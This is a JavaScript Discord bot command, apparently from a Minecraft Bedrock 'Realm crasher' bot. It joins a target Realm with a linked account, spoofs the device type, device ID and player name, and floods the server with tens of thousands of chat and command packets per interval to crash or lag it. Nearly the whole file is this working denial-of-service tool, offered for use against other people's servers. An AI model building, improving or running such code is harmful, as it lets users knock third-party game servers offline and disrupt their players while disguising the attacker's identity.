const { SlashCommandBuilder, EmbedBuilder } = require("discord.js");
const config = require('../../data/discord/config.json');
const fs = require('node:fs').promises;
const colors = require('../../data/handles/colors.js');
const path = require('path');
const { createClient } = require('bedrock-protocol');
const { dumprealm, checkaccount, getrealminfo } = require('../../men/realms');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { Authflow, Titles } = require("prismarine-auth");
const skinData = require('../../data/skins/jenny.json');
const { reply1, reply2 } = require('../../data/discord/emojies.js');

// Helper function to check if a file or folder exists
async function fileExists(filePath) {
  try {
    await fs.access(filePath);
    return true;
  } catch {
    return false;
  }
}

module.exports = {
  data: new SlashCommandBuilder()
    .setName("explode")
    .setIntegrationTypes(0, 1)
    .setContexts(0, 1, 2)
    .setDescription("Explode the Realm")
    .addStringOption(option =>
      option.setName('invite')
        .setDescription('Realm invite code or Realm ID')
        .setRequired(true)
        .setMinLength(8)
        .setMaxLength(15))
    .addIntegerOption(option =>
      option.setName('device')
        .setDescription('What Device Spoof')
        .setRequired(true)
        .addChoices(
          { name: 'Silly Cat +', value: 69696 },
          { name: 'Silly Cat -', value: -69696 },
          { name: 'Samsung Fridge', value: 16 },
          { name: 'Samsung Washmaschine', value: 17 },
          { name: 'Guh', value: 18 },
          { name: 'Unknowen', value: 0 },
          { name: 'Android', value: 1 },
          { name: 'IOS', value: 2 },
          { name: 'OSX', value: 3 },
          { name: 'FireOS', value: 4 },
          { name: 'GearVR', value: 5 },
          { name: 'Hololens', value: 6 },
          { name: 'Windows 10 (x64)', value: 7 },
          { name: 'Windows 10(x86)', value: 8 },
          { name: 'Dedicated Server', value: 9 },
          { name: 'TvOS (Appel TV)', value: 10 },
          { name: 'Playstation', value: 11 },
          { name: 'Nitendo Switch', value: 12 },
          { name: 'XBOX', value: 13 },
          { name: 'Phone (windows)', value: 14 },
          { name: 'Linux', value: 15 },
        ))
    .addIntegerOption(option =>
      option.setName('duration')
        .setDescription('Duration in seconds to send packets')
        .setRequired(true)
        .setMinValue(10)
        .setMaxValue(1000))
    .addIntegerOption(option =>
      option.setName('mode')
        .setDescription('Choose the lag mode')
        .setRequired(true)
        .addChoices(
          { name: 'Type 1', value: 1 },
          { name: 'Type 2', value: 2 },
          { name: 'Type 3', value: 3 },
          { name: 'Type 4', value: 4 }
        ))
    .addStringOption(option =>
      option.setName('namespoof_name')
        .setDescription('Name Spoof Name')
        .setRequired(false)),
  async execute(interaction) {
    const invite = interaction.options.getString('invite');
    let disconnected = false;
    const mode = interaction.options.getInteger('mode');
    const device = interaction.options.getInteger('device');
    const namespoof = interaction.options.getString('namespoof_name') || " ";
    const duration = interaction.options.getInteger('duration');

    const off = "⚫";
    const waiting = "🟡";
    const done = "🟢";
    const err1 = "🔴";

    try {
      const main = new EmbedBuilder()
        .setTitle("Realm Crash")
        .setDescription("Loading data, this may take a few seconds depending on the workload.")
        .setFields(
          { name: 'Connected', value: off, inline: false },
          { name: 'Crashing', value: off, inline: false },
          { name: 'Disconnected', value: off, inline: false },
          { name: 'Disconnected Reason', value: waiting, inline: false },
        )
        .setColor(config.embeds.color);

      await interaction.reply({ embeds: [main] });

      // Load the user database asynchronously
      const databasePath = './data/user/users.json';
      let database;
      try {
        const dbData = await fs.readFile(databasePath, 'utf8');
        database = JSON.parse(dbData);
      } catch (error) {
        return interaction.editReply({
          content: 'Failed to load the database.',
          ephemeral: true,
        });
      }

      // Ensure the user's profile folder exists
      const profileFolderPath = `./data/user/profilefolders/${interaction.user.id}`;
      if (!(await fileExists(profileFolderPath))) {
        await interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setTitle('Account Not Linked')
              .setDescription("It seems like you haven't linked an account yet.\nPlease link an account with '/link' to use this command.")
              .setColor(0xff0000),
          ],
        });
        return;
      }

      // Load whitelist and check if the invite is blocked
      const whitelistPath = './data/util/whitelist.json';
      let whitelist = [];
      try {
        const wlData = await fs.readFile(whitelistPath, 'utf8');
        whitelist = JSON.parse(wlData);
      } catch (error) {
        // If reading fails, assume an empty whitelist.
      }
      if (whitelist.includes(invite)) {
        return interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setTitle('Realm Error')
              .setDescription(`The invite ${invite} is in the whitelist and cannot be nuked.`)
              .setColor(config.embeds.color)
          ]
        });
      }

      const realm = await getrealminfo(invite);
      if (!realm) {
        console.error(`[${new Date().toLocaleTimeString()}] Error: Realm not found`);
        return interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setTitle('Realm Error')
              .setDescription('Invalid code: realm not found or account banned.')
              .setColor(config.embeds.color)
          ]
        });
      }

      const client = createClient({
        profilesFolder: profileFolderPath,
        username: interaction.user.id,
        offline: false,
        realms: invite.length === 8
          ? { realmId: invite }
          : { realmInvite: invite },
        skinData: {
          DeviceOS: device,
          DeviceId: getDeviceId(device),
          PlatformOnlineId: genrandomstring(19, '1234567890'),
          PrimaryUser: false,
          SelfSignedId: uuidv4(),
          ThirdPartyName: namespoof,
          ThirdPartyNameOnly: true,
          TrustedSkin: true,
          ...skinData
        },
        skipPing: true
      });

      client.on('server_stats', async (err) => {
        console.error(`${colors.blue}[${new Date().toLocaleTimeString()}]${colors.yellow} Buggy Packet Received: ${err.message || err}`);
      });

      client.on('error', async (err) => {
        console.error(`${colors.blue}[${new Date().toLocaleTimeString()}] ${colors.yellow} Client error: ${err.message || err}`);
        main.setDescription("Wops! There was an error while trying to join the Realm");
        main.setFields(
          { name: 'Connected', value: off, inline: false },
          { name: 'Crashing', value: err1, inline: false },
          { name: 'Disconnected', value: err1, inline: false },
          { name: 'Disconnected Reason', value: `${err}`, inline: false }
        );
        interaction.editReply({ embeds: [main] });
        return;
      });

      client.on('play_status', async () => {
        console.log(`${colors.green}[Realm Watcher]>> User ${interaction.user.username}/${interaction.user.id} joined Realm ${realm.name}/${invite}`);
        try {
          main.setDescription(`${reply1}Realm Name: ${realm.name}\n${reply1}Realm ID: ${realm.id}\n${reply2}Realm IP: ${realm.ip}`);
          main.setFields(
            { name: 'Connected', value: done, inline: false },
            { name: 'Crashing', value: waiting, inline: false },
            { name: 'Disconnected', value: waiting, inline: false },
            { name: 'Disconnected Reason', value: waiting, inline: false }
          );
          interaction.editReply({ embeds: [main] });

          let intervalId;
          setTimeout(() => {
            if (disconnected) return;
            main.setFields(
              { name: 'Connected', value: done, inline: false },
              { name: 'Crashing', value: done, inline: false },
              { name: 'Disconnected', value: waiting, inline: false },
              { name: 'Disconnected Reason', value: waiting, inline: false }
            );
            interaction.editReply({ embeds: [main] });
            const sendCommand = (command) => {
              client.queue('command_request', command);
            };
            intervalId = setInterval(() => {
              if (mode === 1) {
                crash1(sendCommand);
              } else if (mode === 2) {
                crash2(sendCommand);
              } else if (mode === 3) {
                crash3(sendCommand);
              } else if (mode === 4) {
                crash4(sendCommand);
              }
            }, 360);
          }, 0);

          setTimeout(() => {
            if (!disconnected) {
              clearInterval(intervalId);
              client.close();
              main.setFields(
                { name: 'Connected', value: done, inline: false },
                { name: 'Crashing', value: done, inline: false },
                { name: 'Disconnected', value: done, inline: false },
                { name: 'Disconnected Reason', value: waiting, inline: false }
              );
              interaction.editReply({ embeds: [main] });
              disconnected = true;
            }
          }, duration * 1000);
        } catch (error) {
          console.error(error);
          throw error;
        }
      });

      const errorMessages = {
        "disconnectionScreen.noReason": "You have been disconnected from the Realm because of sending too many packets",
        "disconnection.kicked.reason": "You have been Kicked From the Realm",
        "disconnection.kicked": "You have been Kicked From the Realm",
        "disconnectionScreen.outdatedClient": "The Realm is outdated!",
        "disconnectionScreen.disconnected": "Disconnected from the Realm",
        "disconnectionScreen.serverFull": "Realm is Currently Full",
        "disconnectionScreen.notAllowed": "Something didn't go right, try to use a less longer NameSpoof Name. (notAllowed)",
        "disconnectionScreen.serverIdConflict": "Client already in this Realm. Leave with the Account or wait until your Interaction is done",
        "disconnectionScreen.loggedinOtherLocation": "Client already in this Realm. Leave with the Account or wait until your Interaction is done",
        "disconnectionScreen.worldCorruption": "The world on this realm is corrupted, Unable to Join",
        "disconnect.scriptWatchdog": "The realm was shut down due to an unhandled scripting watchdog exception.",
        "disconnect.scriptWatchdogOutOfMemory": "The realm was shut down because of scripting memory limit."
      };

      function parseKickMessage(error) {
        for (const key in errorMessages) {
          error = error.replace(key, errorMessages[key]);
        }
        return error;
      }

      client.on('kick', async (reason) => {
        console.log(`${colors.blue}[${new Date().toLocaleTimeString()}] ${colors.red} Client Kicked from the Realm. ${realm.id}/${realm.name}. ${parseKickMessage(reason.message)}`);
        main.setFields(
          { name: 'Connected', value: off, inline: false },
          { name: 'Crashing', value: err1, inline: false },
          { name: 'Disconnected', value: err1, inline: false },
          { name: 'Disconnected Reason', value: parseKickMessage(reason.message), inline: false }
        );
        interaction.editReply({ embeds: [main] });
      });

      client.on('close', async (err) => {
        if (!err) return;
        if (disconnected) return;
        disconnected = true;
        console.log(`${colors.blue}[${new Date().toLocaleTimeString()}]${colors.red} Client closed Connection from the Realm. ${realm.id}/${realm.name}.`);
        main.setFields(
          { name: 'Connected', value: off, inline: false },
          { name: 'Crashing', value: err1, inline: false },
          { name: 'Disconnected', value: err1, inline: false },
          { name: 'Disconnected Reason', value: parseKickMessage(err.message || "N/A"), inline: false }
        );
        interaction.editReply({ embeds: [main] });
      });
    } catch (err) {
      console.error(err);
    }
  }
};

// Crash functions – sending a flood of commands
function crash1(sendCommand) {
  for (let i = 0; i < 5000; i++) {  
    sendCommand({
      command: `/tell @a §l§c§k${"@e".repeat(70)}`,
      origin: {
        type: 5,
        uuid: "",
        request_id: uuidv4(),
      },
      internal: false,
      version: 66,
    });
  }
}

function crash2(sendCommand) {
  for (let i = 0; i < 50000; i++) {  
    sendCommand({
      command: "/me oi oi oi",
      origin: {
        type: 5,
        uuid: "",
        request_id: uuidv4(),
      },
      internal: false,
      version: 66,
    });
  }
}

function crash3(sendCommand) {
  for (let i = 0; i < 50000; i++) {  
    sendCommand({
      command: "/list",
      origin: {
        type: 0,
        uuid: "",
        request_id: uuidv4(),
      },
      internal: false,
      version: 66,
    });
  }
}

function crash4(sendCommand) {
  for (let i = 0; i < 50000; i++) {  
    sendCommand({
      command: "/help",
      origin: {
        type: 0,
        uuid: "",
        request_id: uuidv4(),
      },
      internal: false,
      version: 66,
    });
  }
}

function genrandomstring(length, charSet) {
  if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += charSet.charAt(Math.floor(Math.random() * charSet.length));
  }
  return result;
}

function colorizeText(text) {
  const words = text.split(' ');
  const coloredWords = words.map(word => {
    const colorCode = randomCode();
    return `${colorCode}${word}`;
  });
  return coloredWords.join(' ');
}

function rainbowText(text) {
  const colorsArr = ['§c', '§6', '§e', '§a', '§b', '§9', '§d', '§f'];
  let rainbowedText = '';
  for (let i = 0; i < text.length; i++) {
    rainbowedText += colorsArr[i % colorsArr.length] + text[i];
  }
  return rainbowedText;
}

function randomCode() {
  const optionsString = "1234567890";
  const optionsArray = optionsString.split('');
  const randomIndex = Math.floor(Math.random() * optionsArray.length);
  const randomOption = optionsArray[randomIndex];
  return "§" + randomOption;
}

function emojie1(length) {
  const characters = '';
  let result = '';
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

function getDeviceId(deviceOS) {
  const getUUIDv3 = () => uuidv3(uuidv4(), NIL);
  const getUUIDv5 = () => uuidv5(uuidv4(), NIL);
  switch (deviceOS) {
    case 1:
      return uuidv4().replace(/-/g, "");
    case 2:
      return uuidv4().replace(/-/g, "").toUpperCase();
    case 7:
      return getUUIDv3();
    case 8:
      return getUUIDv3();
    case 11:
      return getUUIDv3();
    case 12:
      return getUUIDv5();
    case 13:
      return genrandomstring(44, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890/=+");
    default:
      return uuidv4();
  }
}
